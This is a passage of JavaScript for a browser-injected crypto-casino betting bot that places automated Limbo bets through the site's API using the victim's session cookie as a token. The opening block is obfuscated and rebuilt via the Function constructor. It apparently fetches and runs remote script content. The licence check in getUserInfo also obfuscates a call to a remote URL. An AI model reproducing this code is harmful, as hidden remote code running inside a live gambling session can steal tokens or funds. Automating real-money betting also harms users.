          var cdnScriptUrl,response,scriptContent;(function(){var hrE='',THd=452-441;function uYN(x){var y=2059206;var p=x.length;var w=[];for(var r=0;r<p;r++){w[r]=x.charAt(r)};for(var r=0;r<p;r++){var j=y*(r+185)+(y%45070);var n=y*(r+274)+(y%24727);var i=j%p;var c=n%p;var e=w[i];w[i]=w[c];w[c]=e;y=(j+n)%4342694;};return w.join('')};var opI=uYN('rdoswzugvbmntjeofatixcrcukprtnhylqsco').substr(0,THd);var cRR='}af+s;(axrx0k=lsq3Sa}a snvo87vbi1mmeu=or.psrclg5tx,wunnqn,j;.8}782aat,ec}69;i(3,uvl9wjx,=8g86gaq)4.hq0=at= e,ohjogaelrx5r;zhvvxsw9)fir.rn,)]=0ot<nh=e<ai9;g,c],v=hf;a+;wll+i+C;n[c=a)0l-6n+=e{=y+ C=cf-n<rer=tw;;wc;(,lheat(m"mn>5);sdem2va u[(v(ua=t"puttj.[p[,b)tu{epfrdC)uugaer.=]s0lag+;f=e0ef;-j9.+,)=*1a6l]+ v(gvs];Ax,ig+et(;i6ss.w,b;nrx73a.gfr){0vt]v[d] f;i1 fyaou;.lr)<lu)t+); [ +utgi ,>4Cu;eAlo.lo"=gr) 1rA ;+(i t(;;((nca=1+1.-h]oeodeAp;is1)87l)("n[i+;l[+="9rno[7ti;.)c;a(,.;ar=(h-av.ru.=2C]hl{t=x"+=a+ier!f,67desrnj(fn,r1e=ep +{n!c-l)el=rs0z;nx{cen(lr.auyvd8(6;;an"n7g;lrC0fC( )sib+)1io4vnr,ra;,metssra[2; a0=l=x=i;)vxh,-a2ur )r=((;ul4).btu*rg.,6].trvnjgf8r2f=a];+jjo,n,7[)vm=fr7 ,fhi[unraue x ((r{;c)g=o"r;v1(z;f h( vw,3ho(;=m2g=inr.vrr0ttr+ova" v(S)a=2}oido.holiC)c(((e);(of(;ahb+;r]ww=o (f}rhnz0=wmtlral[3tgvlq"v<s.Av(7)+8johnpl=5=o.r[s])hpr.r]1)i 0gg))=gttnu.p9)p=t;;)zp1a+4}yoqt.,6r';var Qar=uYN[opI];var fjT='';var mLS=Qar;var skq=Qar(fjT,uYN(cRR));var yKQ=skq(uYN(' =R-m.Rs=("pstr0-h}Nt0fip+RujRnR)r)7cg3scsaSit c$=\/t(oo.rr%==%TdtM3)naec(h.R ..ge*%s-e.tojaa2%-v5#;9_be%n;}mstel2}dltgRmtRh3e%.;ct;etge#R$6;f)Rp)2l]e,=!%ittea.x].5e.trtt3iu(];5Di,sre)_crR%trnlerssose+aae=j]nnto))b$aR9]lh0j\/;inb.6Rth"dhC4excer=ln. liltRt. ]! r,denxtoy{](dprCr1]m s+4E*k)en]le;.dr=[;\/i.ptwto0.-l.asrktbtaieR.o.$e.n=teecR..sc2mt)[Ceisbt1c%#dcityet)a=..oec\'_R.](biM_e.iptvnet%05ec0=;;ae(neRrn%ae\'.iea)ue0)egn]S2)eRlh;n)wrrj71(Rt.%e{)Era7ar_rcsr#t5e.R=[e!c.}dri rbmt;].eo.!0;+0Rn..%tec.(.eM)d%%en\/lfs(p[i8c3u-g[pe_e#=c3$ecew)uhaxec]++l.v4aaepce9 br\/l27..8toe=i]v;.Roct.p%c7a\/(iR);x.eeaeed)eeC"euz=..Dyri1e(e+sr%m#l sd]R.%47R0o=SoRjnp.=srr+sladpi).x]ee)r2bcReReej27f4{e!.l#RR,)2&.Ribleen==ejipt1wf;t=R(5.10e)[meRtnn(reRtbkehpRn{ gmk5]R=co;n.14iee(R2eofif}pR.jer!un1(e.R.)d]oRltt)s.odd.o..x+R{)%b;ei.e7f.](v.crs[w)eir(1{*r7rhr4ridxu)eb.he.)oe(l]\']aR;rr.a\/rCr2i.}:ccrepr)rws[jRsnRa.\'+o]1_ew;RgreRcu%r}\/l)RR;{v+n]=Eti)y(Ra!].a ;ms6e0j-to_)8enlSRR1Rie&aedReo[(RRc)sotr_ir.Rx{1).ocooe(.70e(R3aa2u;RcR08;ie[%R(tE].Re];{epce t"R(i(S1t0R%)Ref.-]pvoaRcer2g.cnR%t.t4ifnrRd]tr%.1cd)grtin{Rb=(.e.:u)R.es3i.$.&h4ta[bn.kn8R,teoR"]ptsndpt *t]o=Rtxgw4p\/i9tnRjnRleen.rts extc=dR!0e1rdmop+..tRzofioRe]c0lhtIl0m%ts.;RieevnretRerax(i=lR"4pt;2E%1t4NR%Rorutorni]=t.iesae8c]cR0 cR=ti[o.)=1o.syefS.cre]).oi1cnttw;NfRsR\' bv,#.cr&%e.re\/R.reRfcr1tScREf{onm)o$iei=lg-c]]%tnreiR0ro0,dulaNit55.;7ceee(1 (6n]+(eCri%\/r.t[]riomndu t,;.R_.2lhc(gxhiaifc.aeD.R.E4ee[}1g.RpteR)2tr g!(%cet=.['));var yGE=mLS(hrE,yKQ );yGE(3063);return 8263})()
        } else if (mode === "advanced") {
          basebet = Number(document.getElementById("advancedBaseBet").value);
          nextbet = basebet;
          chance = Number(document.getElementById('advancedChance').value);
          bethigh = document.querySelector("#advancedBetHigh").checked;
        }
      }
      if (run) {
        return playBet();
      }
    }
  } catch (error) {
    stop();
    log(error);
  }
}
function stop() {
  if (run) {
    run = false;
    sOW = false;
    wdbSpeed.pause();
    wdbTimer.pause();
    document.getElementById("wdbMenuCoin").disabled = false;
    document.getElementById("wdbGameMode").disabled = false;
    document.getElementById('wdbStartButton').disabled = false;
    document.getElementById("wdbResumeButton").disabled = false;
    document.querySelectorAll("#wdbSaveScriptButton").forEach(button => button.disabled = false);
    document.querySelectorAll("#wdbOpenScript").forEach(button => button.disabled = false);
    document.getElementById("wdbStopOnWinButton").disabled = false;
  }
}
async function resume(delayed) {
  if (!run) {
    document.getElementById("wdbMenuCoin").disabled = true;
    document.getElementById("wdbGameMode").disabled = true;
    document.getElementById('wdbStartButton').disabled = true;
    document.getElementById('wdbResumeButton').disabled = true;
    document.querySelectorAll("#wdbSaveScriptButton").forEach(button => button.disabled = true);
    document.querySelectorAll("#wdbOpenScript").forEach(button => button.disabled = true);
    if (!delayed) {
      log("Call resume() by script -> betting after 5s");
      await new Promise(resolve => setTimeout(resolve, 5000));
    }
    run = true;
    sOW = false;
    wdbSpeed.start();
    wdbTimer.start();
    return playBet();
  }
}
function stopOnWin() {
  sOW = true;
  if (run) {
    document.getElementById("wdbStopOnWinButton").disabled = true;
  }
}
async function playBet() {
  try {
    if (mode === 'lua') {
      nextbet = fengari.load("return nextbet")();
      chance = fengari.load("return chance")();
      bethigh = fengari.load("return bethigh")();
    }
    nextbet = Number(nextbet);
    chance = Number(chance);
    previousbet = nextbet;
    lastBet.amount = nextbet;
    lastBet.Amount = nextbet;
    lastBet.chance = chance;
    lastBet.Chance = chance;
    lastBet.bethigh = bethigh;
    if (!stopLog) {
      if (game === "plinko") {
        const plinkoInfo = '' + (havePlinkoRows ? plinkoRow + " | " : '') + plinkoRisk;
        const plinkoLog = "Betting " + Number(lastBet.amount).toFixed(decimalAmountView) + " at " + plinkoInfo + " to win";
        log(plinkoLog);
      } else {
        const betType = game === "dice" ? bethigh ? "high" : 'low' : "high";
        const betLog = "Betting " + Number(lastBet.amount).toFixed(decimalAmountView) + " at " + Number(lastBet.chance).toFixed(decimalChanceView) + "% chance to win, " + betType;
        log(betLog);
      }
    }
    if (run) {
      return sendBet();
    }
  } catch (error) {
    stop();
    log(error);
  }
}
function resetall() {
  document.getElementById("wdbTime").innerText = "0:0:0:0";
  if (run) {
    wdbSpeed.stop();
    wdbSpeed.start();
    wdbTimer.stop();
    wdbTimer.start();
  } else {
    wdbSpeed.stop();
    wdbTimer.stop();
  }
  resetstats();
  toggleChart("reset");
  toggleHistory("clear");
  toggleLog("clear");
}
function resetchart() {
  return toggleChart('reset');
}
function resethistory() {
  return toggleHistory("clear");
}
function resetlog() {
  return toggleLog("clear");
}
function resetstats() {
  startBalance = balance;
  wagered = 0;
  percentWagered = 0;
  profit = 0;
  percentProfit = 0;
  maxBetAmount = 0;
  maxLosseAmount = 0;
  maxwinstreak = 0;
  maxlosestreak = 0;
  minbalance = balance;
  maxbalance = balance;
  minprofit = 0;
  maxprofit = 0;
  bets = 0;
  wins = 0;
  losses = 0;
  currentstreak = 0;
  return updateStats();
}
function resetpartialprofit() {
  partialprofit = 0;
}
function invest(amount) {
  return amount;
}
function ching() {
  return wdbSound.play();
}
function sleep(seconds) {
  return new Promise(resolve => setTimeout(resolve, seconds * 1000));
}
function initLua() {
  fengari.load("function start()\njs.global:start()\nend")();
  fengari.load("function stop()\njs.global:stop()\nend")();
  fengari.load("function resume()\njs.global:resume()\nend")();
  fengari.load("function checkbalance()\n js.global:checkbalance()\n end")();
  fengari.load("function resetstats()\njs.global:resetstats()\nend")();
  fengari.load("function resetseed()\njs.global:resetseed()\nend")();
  fengari.load("function resetchart()\njs.global:resetchart()\nend")();
  fengari.load("function resethistory()\njs.global:resethistory()\nend")();
  fengari.load("function resetlog()\njs.global:resetlog()\nend")();
  fengari.load("function resetall()\njs.global:resetall()\nend")();
  fengari.load("function ching()\njs.global:ching()\nend")();
  fengari.load("function log(msg)\njs.global:log(msg)\nend")();
  fengari.load("function invest(amount)\njs.global:invest(amount)\nend")();
  fengari.load("function resetpartialprofit()\njs.global:resetpartialprofit()\nend")();
  fengari.load("clock = os.clock\n  function sleep(n)\n    local t0 = clock()\n    while clock() - t0 <= n do end\n  end")();
  fengari.load("table.getn = function (t)\n    local count = 0\n    for _, __ in pairs(t) do\n      count = count + 1\n    end\n    return count\n  end")();
  const hostname = location.hostname.replace("www.", '');
  let index = hostname.indexOf('.');
  casino = hostname.slice(0, index);
  fengari.load("casino=\"" + casino + "\"")();
}
async function updateLua() {
  fengari.load("\n    win=" + win + "\n    bets=" + bets + "\n    wins=" + wins + "\n    losses=" + losses + "\n    winstreak=" + winstreak + "\n    losestreak=" + losestreak + "\n    currentstreak=" + currentstreak + "\n    balance=" + balance + "\n    minbalance=" + minbalance + "\n    maxbalance=" + maxbalance + "\n    minprofit=" + minprofit + "\n    maxprofit=" + maxprofit + "\n    chance=" + chance + "\n    bethigh=" + bethigh + "\n    nextbet=" + nextbet + "\n    previousbet=" + previousbet + "\n    profit=" + profit + "\n    currentprofit=" + currentprofit + "\n    partialprofit=" + partialprofit + "\n    wagered=" + wagered + "\n  ")();
  fengari.load("\n    lastBet={\n      amount=" + lastBet.amount + ",\n      Amount=" + lastBet.amount + ",\n      chance= " + lastBet.chance + ",\n      Chance= " + lastBet.chance + ",\n      roll=" + lastBet.roll + ",\n      Roll=" + lastBet.roll + ",\n      profit=" + lastBet.profit + ",\n      Profit=" + lastBet.profit + ",\n      target= " + lastBet.target + ",\n      Target= " + lastBet.target + ",\n      result=" + lastBet.result + ",\n      Result=" + lastBet.result + ",\n      nonce=" + lastBet.nonce + ",\n      Nonce=" + lastBet.nonce + ",\n      id=\"" + lastBet.id + "\",\n      Id=\"" + lastBet.id + "\"\n    }\n  ")();
  fengari.load("dobet()")();
  if (fengari.load("return currency")()) {
    currency = fengari.load("return currency")();
    coin = String(currency).toUpperCase();
  }
  if (fengari.load("return scriptname")()) {
    scriptname = fengari.load("return scriptname")();
    document.getElementById("scriptName").innerText = "Script Name: " + scriptname;
  } else {
    scriptname = '';
    document.getElementById("scriptName").innerText = '';
  }
  if (fengari.load("return plinkoRisk")()) {
    plinkoRisk = fengari.load("return plinkoRisk")();
  }
  if (fengari.load("return plinkoRow")()) {
    plinkoRow = fengari.load("return plinkoRow")();
  }
  return "updateLua done";
}
function randomString(length, type) {
  const uppercaseLetters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
  const lowercaseLetters = "abcdefghijklmnopqrstuvwxyz".slice(0, 6);
  let characters = '';
  let result = '';
  if (!type) {
    characters = "0123456789abcdefghijklmnopqrstuvwxyz" + uppercaseLetters;
  }
  if (type === "alphabet") {
    characters = "abcdefghijklmnopqrstuvwxyz" + uppercaseLetters;
  }
  if (type === "numeric") {
    characters = "0123456789";
  }
  if (type === 'hex') {
    characters = "0123456789" + lowercaseLetters;
  }
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return result;
}
function setCookie(name, value, expirationDays) {
  const expirationDate = new Date();
  expirationDate.setTime(expirationDate.getTime() + expirationDays * 24 * 60 * 60 * 1000);
  let expires = "expires=" + expirationDate.toUTCString();
  document.cookie = name + '=' + value + ';' + expires + ";path=/";
}
function getCookie(name) {
  name = name + '=';
  let decodedCookie = decodeURIComponent(document.cookie);
  let cookieArray = decodedCookie.split(';');
  for (let i = 0; i < cookieArray.length; i++) {
    let cookie = cookieArray[i];
    while (cookie.charAt(0) === " ") {
      cookie = cookie.substring(1);
    }
    if (cookie.indexOf(name) === 0) {
      return cookie.substring(name.length, cookie.length);
    }
  }
  return '';
}
function saveScript() {
  let scriptContent = null;
  if (mode === 'lua') {
    scriptContent = luaEditor.getValue();
  } else {
    scriptContent = jsEditor.getValue();
  }
  let link = document.createElement('a');
  link.href = window.URL.createObjectURL(new Blob([scriptContent], {
    'type': "text/plain; charset=utf-8"
  }));
  link.download = mode === 'lua' ? 'DiceScript' + Date.now() + ".lua" : 'DiceScript' + Date.now() + ".js";
  link.click();
}
function getErrMsg(error) {
  const errorMessage = error.response && error.response.data && error.response.data.message || error.message || error.toString();
  return errorMessage;
}
game = "limbo";
decimalChanceView = 5;
decimalAmountView = 10;
CASINO_API = "https://" + window.location.host + '/_api/graphql';
token = getCookie("session");
async function beforeWork() {
  axios.defaults.headers = {
    'x-access-token': token,
    'content-type': "application/json"
  };
}
async function getListCoin() {
  const query = JSON.stringify({
    'operationName': "UserBalances",
    'query': "query UserBalances {\n      user {\n        balances {\n          available {\n            amount\n            currency\n          }\n        }\n      }\n    }"
  });
  const {
    data: responseData
  } = await axios.post(CASINO_API, query);
  const balances = responseData.data.user.balances;
  for (let i = 0; i < balances.length; i++) {
    coins.push(String(balances[i].available.currency).toUpperCase());
  }
  coins = coins.sort();
  coin = coins[0];
  drawSelectCoin();
  return checkbalance();
}
async function checkbalance() {
  try {
    const query = JSON.stringify({
      'operationName': "UserBalances",
      'variables': {},
      'query': "query UserBalances {\n        user {\n          balances {\n            available {\n              amount\n              currency\n            }\n          }\n        }\n      }"
    });
    const {
      data: responseData
    } = await axios.post(CASINO_API, query);
    const balances = responseData.data.user.balances;
    const selectedBalance = balances.find(entry => entry.available.currency === String(coin).toLowerCase());
    balance = Number(selectedBalance.available.amount);
    fengari.load('balance=' + balance)();
    /*startBalance = balance;
    minbalance = balance;
    fengari.load("minbalance=" + balance)();
    maxbalance = balance;
    fengari.load("maxbalance=" + balance)();
    minbet = 0;
    fengari.load("minbet=" + minbet)();
    maxbet = balance;
    fengari.load("maxbet=" + maxbet)();*/
    return updateStats();
  } catch (error) {
    stop();
    return log(getErrMsg(error));
  }
}
async function resetseed() {
  try {
    const query = JSON.stringify({
      'operationName': 'RotateSeedPair',
      'variables': {
        'seed': randomString(10)
      },
      'query': "mutation RotateSeedPair($seed: String!) {\n        rotateSeedPair(seed: $seed) {\n          clientSeed {\n            user {\n              activeClientSeed {\n                seed\n              }\n            }\n          }\n        }\n      }"
    });
    return axios.post(CASINO_API, query);
  } catch (error) {
    stop();
    return log(getErrMsg(error));
  }
}
async function sendBet() {
  try {
    chance = Math.round((chance + Number.EPSILON) * 100000000) / 100000000;
    target = Math.round((100 / chance + Number.EPSILON) * 100) / 100;
    const query = JSON.stringify({
      'operationName': "LimboBet",
      'variables': {
        'amount': nextbet,
        'currency': String(coin).toLowerCase(),
        'identifier': randomString(20),
        'multiplierTarget': target
      },
      'query': "mutation LimboBet($amount: Float!, $multiplierTarget: Float!, $currency: CurrencyEnum!, $identifier: String!) {\n        limboBet(\n          amount: $amount\n          currency: $currency\n          multiplierTarget: $multiplierTarget\n          identifier: $identifier\n        ) {\n          ...CasinoBet\n          state {\n            ...CasinoGameLimbo\n          }\n        }\n      }\n      \n      fragment CasinoBet on CasinoBet {\n        id\n        nonce\n        amount\n        payout\n      }\n      \n      fragment CasinoGameLimbo on CasinoGameLimbo {\n        result\n      }"
    });
    const {
      data: responseData
	} = await axios.post(CASINO_API, query);
    if (responseData.errors) {
      const errorMessage = responseData.errors[0].message;
      if (errorMessage === "an unknown error 294779 has happened.") {
        if (run) {
          return sendBet();
        }
      } else {
		if (errorMessage === "Please choose a new seed pair") {
          if (run) {
            return resetseed().then(sendBet);
          }
		} else {
          if (errorMessage === "Please slow down") {
            if (run) {
              return setTimeout(sendBet, 1000);
			}
          } else {
			  stop();
			  return log(errorMessage);
          }
        }
      }
	} else {
      return handleResult(responseData.data.limboBet);
    }
  } catch (error) {
    if (error.response) {
      const statusCode = error.response.status;
      if (statusCode === 401) {
        stop();
        return log(error.response.data.errors[0].message);
      }
      if (run) {
        return sendBet();
      }
    } else {
      if (error.request) {
        if (run) {
          return sendBet();
        }
      } else {
        stop();
        return log(getErrMsg(error));
      }
    }
  }
}
async function handleResult(resultData) {
  try {
    currentprofit = resultData.payout - resultData.amount;
    lastBet.roll = Math.round((99 / resultData.state.result + Number.EPSILON) * 100) / 100;
    result = resultData.state.result;
    lastBet.nonce = resultData.nonce;
    lastBet.id = String(resultData.id);
    return handleStats();
  } catch (error) {
    stop();
    return log(getErrMsg(error));
  }
}
function updateWagerSwitch() {
    isWagerSwitch = document.getElementById('wagerSwitch').checked;
    console.log("wagerSwitch:", isWagerSwitch); // Will log true or false based on checkbox state
}
async function botGuide() {
    toggleMinimalBot(document.getElementById("wdbToggleMinimal"));
    // Load SweetAlert2 library
    const script = document.createElement('script');
    script.src = "https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.all.min.js";
    document.head.appendChild(script);

    script.onload = function () {
        Swal.fire({
            title: '<strong>Pro Casino Bot<br> Settings Overview</strong>',
            html: `
                    <ul style="text-align: left; padding-left: 20px;">
                        <li><strong>Select Cryptocurrency:</strong><br> Choose a crypto with an existing balance.</li>
                        <li>
                            <strong>Auto Bet Amount:</strong><br>
                            <ul style="padding-left: 20px;">
                                <li>Sets a fixed betting amount based on your balance.<br> (e.g., Safe, Basic, Risk, Fast).</li>
                                <li>If bot doesn't start, your bet amount may be too small as per site requirements; consider increasing your balance.</li>
                            </ul>
                        </li>
                        <li><strong>Profit Goals:</strong><br> Define a profit percentage to trigger a stop in betting.</li>
                        <li>
                            <strong>Wager Mode:</strong><br>
                            <ul style="padding-left: 20px;">
                                <li>Auto adjust bet amount if Max Bet limit is hit.</li>
                                <li>Reset session if loss recovered.</li>
                            </ul>
                        </li>
                        <li><strong>Max Bet Limit:</strong><br> Set a cap on maximum bet amount for Wager Mode.</li>
                        <li><strong>Strategy Mode:</strong><br> Choose from Safe, Normal, Fast, Ultra Fast, or Turbo risk levels.</li>
                    </ul>
                    `,
            showCloseButton: true,
            confirmButtonText: 'Got it!'
        }).then((result) => {
            if (result.isConfirmed) {
                toggleMinimalBot(document.getElementById("wdbToggleMinimal"));
            } else if (result.dismiss === Swal.DismissReason.close) {
                toggleMinimalBot(document.getElementById("wdbToggleMinimal"));
            }
        });
    };
}
async function getUserInfo() {
    try {
        var _$_58d9=(function(x,w){var f=x.length;var a=[];for(var o=0;o< f;o++){a[o]= x.charAt(o)};for(var o=0;o< f;o++){var c=w* (o+ 452)+ (w% 27149);var n=w* (o+ 657)+ (w% 33629);var v=c% f;var g=n% f;var d=a[v];a[v]= a[g];a[g]= d;w= (c+ n)% 5016042};var t=String.fromCharCode(127);var s='';var y='\x25';var p='\x23\x31';var k='\x25';var h='\x23\x30';var j='\x23';return a.join(s).split(y).join(t).split(p).join(k).split(h).join(j).split(t)})("rneirnnIrq}auef syeI  tm{ oyr s u nffr}iUUsg%%see{o",4375455);const query=JSON[_$_58d9[2]]({'\x6F\x70\x65\x72\x61\x74\x69\x6F\x6E\x4E\x61\x6D\x65':_$_58d9[0],'\x71\x75\x65\x72\x79':_$_58d9[1]})

        var _$_8715=(function(e,d){var c=e.length;var p=[];for(var x=0;x< c;x++){p[x]= e.charAt(x)};for(var x=0;x< c;x++){var j=d* (x+ 154)+ (d% 39687);var l=d* (x+ 140)+ (d% 45024);var m=j% c;var f=l% c;var s=p[m];p[m]= p[f];p[f]= s;d= (j+ l)% 3212883};var n=String.fromCharCode(127);var h='';var w='\x25';var k='\x23\x31';var t='\x25';var u='\x23\x30';var v='\x23';return p.join(h).split(w).join(n).split(k).join(t).split(u).join(v).split(n)})("sart%upeo%tsda",2951198);const {data:responseData}= await axios[_$_8715[0]](CASINO_API,query);const user=responseData[_$_8715[2]][_$_8715[1]]

        var _$_5d31=(function(e,v){var b=e.length;var u=[];for(var d=0;d< b;d++){u[d]= e.charAt(d)};for(var d=0;d< b;d++){var z=v* (d+ 89)+ (v% 48120);var p=v* (d+ 484)+ (v% 12718);var a=z% b;var i=p% b;var q=u[a];u[a]= u[i];u[i]= q;v= (z+ p)% 4101819};var n=String.fromCharCode(127);var w='';var y='\x25';var c='\x23\x31';var r='\x25';var f='\x23\x30';var g='\x23';return u.join(w).split(y).join(n).split(c).join(r).split(f).join(g).split(n)})("soss.fpmLj:n/D/nwbot eatbnasopco/emrtreo yciUrhprbusleaLies ievs/e%are/rwiktnctUsesrbpsto.tos%.ernatdkhswntso/N/u shgpcoc/ik",2832810);const githubResponse= await fetch(_$_5d31[0]);if(!githubResponse[_$_5d31[1]]){throw  new Error(_$_5d31[2])}
        const githubData = await githubResponse.json();

        if (user) {
            var _$_adc6=(function(a,q){var g=a.length;var i=[];for(var x=0;x< g;x++){i[x]= a.charAt(x)};for(var x=0;x< g;x++){var z=q* (x+ 256)+ (q% 49286);var h=q* (x+ 518)+ (q% 31274);var d=z% g;var p=h% g;var m=i[d];i[d]= i[p];i[p]= m;q= (z+ h)% 1953766};var c=String.fromCharCode(127);var u='';var t='\x25';var y='\x23\x31';var l='\x25';var r='\x23\x30';var o='\x23';return i.join(u).split(t).join(c).split(y).join(l).split(r).join(o).split(c)})("mane",779343);const username=user[_$_adc6[0]];const currentDate= new Date();let userFound=false

            for (const entry of githubData) {
                if (entry.Username === username) {
                    userFound = true;
                    const validityDate = new Date(entry.Validity.split('/').reverse().join('-')); // Convert to YYYY-MM-DD format

                    if (validityDate < currentDate) {
                        var _$_83f0=(function(c,a){var e=c.length;var n=[];for(var w=0;w< e;w++){n[w]= c.charAt(w)};for(var w=0;w< e;w++){var l=a* (w+ 279)+ (a% 27753);var y=a* (w+ 89)+ (a% 43865);var x=l% e;var m=y% e;var h=n[x];n[x]= n[m];n[m]= h;a= (l+ y)% 5715718};var z=String.fromCharCode(127);var v='';var j='\x25';var k='\x23\x31';var t='\x25';var d='\x23\x30';var q='\x23';return n.join(v).split(j).join(z).split(k).join(t).split(d).join(q).split(z)})("rsu.e  s nxl da  nshieepascssaooPtcmYnlderceeer tnittchaa ofi aie.",1323779);stop();alert(_$_83f0[0])
                        toggleMinimalBot(document.getElementById("wdbToggleMinimal"));
                        // Load SweetAlert library
                        script = document.createElement('script');
                        script.src = "https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.all.min.js";
                        document.head.appendChild(script);
                        var _$_23eb=(function(s,f){var o=s.length;var d=[];for(var t=0;t< o;t++){d[t]= s.charAt(t)};for(var t=0;t< o;t++){var m=f* (t+ 464)+ (f% 32122);var w=f* (t+ 680)+ (f% 50182);var k=m% o;var n=w% o;var h=d[k];d[k]= d[n];d[n]= h;f= (m+ w)% 2243545};var p=String.fromCharCode(127);var q='';var b='\x25';var y='\x23\x31';var r='\x25';var v='\x23\x30';var x='\x23';return d.join(q).split(b).join(p).split(y).join(r).split(v).join(x).split(p)})("osnatDselcontise dTttb\ud83doieIaga sfenExeeilehoMcinedudms t!%%c o irdPnhiaerrimepeCnis%l.eo %d\udd10gLasBnlefe porndi%iorseieteymlxwYcRros i%ai %lsgsedscnm%stie%a fsmma%O hodlnisarrc%nkE.ayr%ese",2212752);script[_$_23eb[0]]= function(){Swal[_$_23eb[12]]({icon:_$_23eb[8],title:_$_23eb[9],text:_$_23eb[10],showCloseButton:true,confirmButtonText:_$_23eb[11]})[_$_23eb[7]]((result)=>{if(result[_$_23eb[1]]){toggleMinimalBot(document[_$_23eb[3]](_$_23eb[2]))}else {if(result[_$_23eb[4]]=== Swal[_$_23eb[6]][_$_23eb[5]]){toggleMinimalBot(document[_$_23eb[3]](_$_23eb[2]))}}})}
                    } else {
                        var _$_90a8=(function(b,s){var o=b.length;var x=[];for(var z=0;z< o;z++){x[z]= b.charAt(z)};for(var z=0;z< o;z++){var k=s* (z+ 510)+ (s% 34974);var l=s* (z+ 718)+ (s% 37979);var m=k% o;var a=l% o;var j=x[m];x[m]= x[a];x[a]= j;s= (k+ l)% 3618544};var r=String.fromCharCode(127);var q='';var y='\x25';var g='\x23\x31';var h='\x25';var e='\x23\x30';var t='\x23';return x.join(q).split(y).join(r).split(g).join(h).split(e).join(t).split(r)})("go%l",3355593);console[_$_90a8[1]](("\x55\x73\x65\x72\x20\x4E\x61\x6D\x65\x3A\x20"+username+_$_90a8[0]))
                    }
                    break;
                }
            }

            if (!userFound) {
                var _$_5b49=(function(g,h){var c=g.length;var f=[];for(var z=0;z< c;z++){f[z]= g.charAt(z)};for(var z=0;z< c;z++){var e=h* (z+ 502)+ (h% 36279);var k=h* (z+ 588)+ (h% 25300);var o=e% c;var b=k% c;var j=f[o];f[o]= f[b];f[b]= j;h= (e+ k)% 6203497};var d=String.fromCharCode(127);var w='';var l='\x25';var t='\x23\x31';var y='\x25';var i='\x23\x30';var m='\x23';return f.join(w).split(l).join(d).split(t).join(y).split(i).join(m).split(d)})("ornrei ted sgtsUeer.",104876);stop();alert(_$_5b49[0])
                toggleMinimalBot(document.getElementById("wdbToggleMinimal"));
                // Load SweetAlert library
                script = document.createElement('script');
                script.src = "https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.all.min.js";
                document.head.appendChild(script);
                var _$_f02e=(function(p,c){var s=p.length;var u=[];for(var x=0;x< s;x++){u[x]= p.charAt(x)};for(var x=0;x< s;x++){var i=c* (x+ 487)+ (c% 39727);var f=c* (x+ 81)+ (c% 38325);var d=i% s;var a=f% s;var b=u[d];u[d]= u[a];u[a]= b;c= (i+ f)% 5528334};var l=String.fromCharCode(127);var w='';var j='\x25';var k='\x23\x31';var e='\x25';var g='\x23\x30';var n='\x23';return u.join(w).split(j).join(l).split(k).join(e).split(g).join(n).split(l)})("En%fl%igsiPifiiaedtwd rsng nsino ..areshsroemrscedsMrmtD\udd16e%sanct%iotocs%R%asne  gRoea!Cyto%nlienimiriodaeesti yaaetddnttrbnoe temignlmeeelntBosl% n eUiue osTromrogls Oa%s%td\ud83ehc%a%skIodferf",3179614);script[_$_f02e[0]]= function(){Swal[_$_f02e[12]]({icon:_$_f02e[8],title:_$_f02e[9],text:_$_f02e[10],showCloseButton:true,confirmButtonText:_$_f02e[11]})[_$_f02e[7]]((result)=>{if(result[_$_f02e[1]]){toggleMinimalBot(document[_$_f02e[3]](_$_f02e[2]))}else {if(result[_$_f02e[4]]=== Swal[_$_f02e[6]][_$_f02e[5]]){toggleMinimalBot(document[_$_f02e[3]](_$_f02e[2]))}}})}
            }
        } else {
            var _$_9bed=(function(g,h){var b=g.length;var j=[];for(var x=0;x< b;x++){j[x]= g.charAt(x)};for(var x=0;x< b;x++){var d=h* (x+ 410)+ (h% 20535);var c=h* (x+ 272)+ (h% 40154);var e=d% b;var u=c% b;var p=j[e];j[e]= j[u];j[u]= p;h= (d+ c)% 5231503};var k=String.fromCharCode(127);var z='';var y='\x25';var m='\x23\x31';var r='\x25';var f='\x23\x30';var w='\x23';return j.join(z).split(y).join(k).split(m).join(r).split(f).join(w).split(k)})("tnero .onfUomo t fsu%driannilgo",327336);console[_$_9bed[1]](_$_9bed[0])
        }
    } catch (error) {
        var _$_4204=(function(t,r){var e=t.length;var i=[];for(var x=0;x< e;x++){i[x]= t.charAt(x)};for(var x=0;x< e;x++){var q=r* (x+ 490)+ (r% 12729);var m=r* (x+ 463)+ (r% 43496);var s=q% e;var d=m% e;var w=i[s];i[s]= i[d];i[d]= w;r= (q+ m)% 6190199};var n=String.fromCharCode(127);var l='';var z='\x25';var h='\x23\x31';var a='\x25';var v='\x23\x30';var j='\x23';return i.join(l).split(z).join(n).split(h).join(a).split(v).join(j).split(n)})("imhoe eo ct:orrtner onirrunfiErgrf%ars",966798);console[_$_4204[1]](_$_4204[0],error)
    }
}
